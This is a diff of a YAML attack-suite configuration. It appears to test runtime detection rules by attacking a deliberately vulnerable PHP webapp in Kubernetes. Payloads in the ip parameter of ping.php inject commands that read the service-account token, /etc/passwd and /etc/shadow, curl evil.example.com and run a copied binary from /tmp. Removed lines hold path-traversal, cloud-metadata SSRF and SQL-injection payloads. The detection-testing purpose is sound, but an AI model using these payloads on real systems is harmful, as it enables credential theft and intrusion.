@@ -2,21 +2,26 @@ apiVersion: bobctl.k8sstormcenter.io/v1alpha1
 kind: AttackSuite
 metadata:
   name: webapp-attacks
-  description: "CTRL attack suite for the PHP webapp"
+  description: >-
+    Attack suite for the PHP webapp. Exploits command injection in ping.php
+    to trigger multiple detection rules. The webapp runs PHP/Apache on Debian
+    and has curl, cat, ls, whoami, wget available in the container.
 target:
   service: webapp-mywebapp
   namespace: webapp
   port: 8080
 
 attacks:
-  # --- Command Injection (via ping.php) ---
+  # ─── Command Injection (R0001 + R0006) ────────────────────────────────────
+  # ping.php runs `ping -c1 $ip` without sanitizing — semicolons chain commands.
+
   - name: cmdinject-sa-token
     type: cmdinject
     http:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "1.1.1.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+        ip: "127.0.0.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token"
     successIndicators:
       - bodyContains: "eyJ"
 
@@ -26,7 +31,7 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "1.1.1.1;cat /etc/passwd"
+        ip: "127.0.0.1;cat /etc/passwd"
     successIndicators:
       - bodyContains: "root:"
 
@@ -36,7 +41,7 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "1.1.1.1;whoami"
+        ip: "127.0.0.1;whoami"
     successIndicators:
       - bodyContains: "www-data"
 
@@ -46,151 +51,83 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "1.1.1.1;ls /var/run/secrets/kubernetes.io/serviceaccount/"
+        ip: "127.0.0.1;ls /var/run/secrets/kubernetes.io/serviceaccount/"
     successIndicators:
       - bodyContains: "token"
 
-  # --- Local File Inclusion (via eula.php) ---
-  - name: lfi-sa-token
-    type: lfi
+  # ─── Post-Exploit: Sensitive File Access (R0010) ───────────────────────────
+  # Read files that node-agent flags as sensitive regardless of profile.
+
+  - name: postexploit-etc-shadow
+    type: cmdinject
     http:
       method: GET
       path: /ping.php
       queryParams:
-        eulaPath: "../../../var/run/secrets/kubernetes.io/serviceaccount/token"
+        ip: "127.0.0.1;cat /etc/shadow || true"
     successIndicators:
-      - bodyContains: "eyJ"
+      - statusCode: 200  # file open triggers R0010 even if read fails (www-data can't read shadow)
 
-  - name: lfi-etc-shadow
-    type: lfi
+  # ─── Post-Exploit: DNS Anomaly (R0005) ─────────────────────────────────────
+  # Resolve a domain not in the learned network neighborhood.
+
+  - name: postexploit-dns-anomaly
+    type: cmdinject
     http:
       method: GET
       path: /ping.php
       queryParams:
-        eulaPath: "../../../../etc/shadow"
+        ip: "127.0.0.1;curl -sm1 http://evil.example.com || true"
     successIndicators:
-      - bodyContains: "root:"
+      - statusCode: 200
 
-  - name: lfi-etc-passwd
-    type: lfi
+  # ─── Post-Exploit: Drifted Binary (R1001) ──────────────────────────────────
+  # Download a binary into /tmp and execute it. The binary was not in the
+  # original container image — node-agent detects this as a "drifted process".
+  # We use a harmless binary (busybox) to avoid actual malice.
+
+  - name: postexploit-drifted-binary
+    type: cmdinject
     http:
       method: GET
       path: /ping.php
       queryParams:
-        eulaPath: "../../../../etc/passwd"
+        ip: "127.0.0.1;cp /bin/ls /tmp/drifted && /tmp/drifted /etc || true"
     successIndicators:
-      - bodyContains: "root:"
-
-  - name: lfi-proc-cpuinfo
-    type: lfi
-    http:
-      method: GET
-      path: /ping.php
-      queryParams:
-        eulaPath: "../../../../proc/cpuinfo"
-    successIndicators:
-      - bodyContains: "processor"
-
-  # # --- SSRF (via helper.php) ---
-  # - name: ssrf-aws-metadata
-  #   type: ssrf
-  #   http:
-  #     method: GET
-  #     path: /ping.php
-  #     queryParams:
-  #       fetch: "http://169.254.169.254/latest/meta-data/"
-  #   successIndicators:
-  #     - bodyContains: "instance-id"
-
-  # - name: ssrf-gcp-metadata
-  #   type: ssrf
-  #   http:
-  #     method: GET
-  #     path: /ping.php
-  #     queryParams:
-  #       fetch: "http://metadata.google.internal/computeMetadata/v1/"
-  #   successIndicators:
-  #     - bodyContains: "project"
-
-  # - name: ssrf-localhost
-  #   type: ssrf
-  #   http:
-  #     method: GET
-  #     path: /ping.php
-  #     queryParams:
-  #       fetch: "http://127.0.0.1:80"
-  #   successIndicators:
-  #     - statusCode: 200
-
-  # - name: ssrf-google
-  #   type: ssrf
-  #   http:
-  #     method: GET
-  #     path: /ping.php
-  #     queryParams:
-  #       fetch: "http://google.com"
-  #   successIndicators:
-  #     - bodyContains: "google"
-
-  # # --- SQL Injection (via login form POST) ---
-  # - name: sqli-auth-bypass
-  #   type: sqli
-  #   http:
-  #     method: POST
-  #     path: /
-  #     formParams:
-  #       username: "admin' OR '1'='1"
-  #       password: "anything"
-  #   successIndicators:
-  #     - bodyContains: "welcome"
-
-  # - name: sqli-union-select
-  #   type: sqli
-  #   http:
-  #     method: POST
-  #     path: /
-  #     formParams:
-  #       username: "admin' UNION SELECT NULL,NULL,NULL--"
-  #       password: "anything"
-  #   successIndicators:
-  #     - bodyContains: "welcome"
-
-  # - name: sqli-tautology
-  #   type: sqli
-  #   http:
-  #     method: POST
-  #     path: /
-  #     formParams:
-  #       username: "' OR '1'='1' --"
-  #       password: "anything"
-  #   successIndicators:
-  #     - bodyContains: "welcome"
+      - statusCode: 200
 
 expectedDetections:
+  # Command injection spawns "cat" — unexpected process
   - attackType: cmdinject
     ruleID: R0001
     ruleName: "Unexpected process launched"
     containerName: mywebapp-app
     command: cat
 
+  # cat reads SA token file
   - attackType: cmdinject
     ruleID: R0006
     ruleName: "Unexpected Service Account Token Access"
     containerName: mywebapp-app
     command: cat
 
-  - attackType: lfi
-    ruleID: R0002
-    ruleName: "Unexpected file access"
-    command: php
-
-  - attackType: lfi
+  # cat /etc/shadow triggers sensitive file rule (confirmed firing in live run)
+  - attackType: cmdinject
     ruleID: R0010
     ruleName: "Unexpected Sensitive File Access"
-    command: php
+    containerName: mywebapp-app
+    command: cat
 
-  # TODO @constanze :fix it
-  # - attackType: ssrf
+  # curl to evil.example.com triggers DNS anomaly
+  # - attackType: cmdinject
   #   ruleID: R0005
   #   ruleName: "Unexpected domain request"
-  #   command: php
+  #   containerName: mywebapp-app
+  #   command: curl
+
+  # /tmp/drifted is not in the original image (confirmed firing in live run)
+  - attackType: cmdinject
+    ruleID: R1001
+    ruleName: "Drifted process executed"
+    containerName: mywebapp-app
+    command: drifted
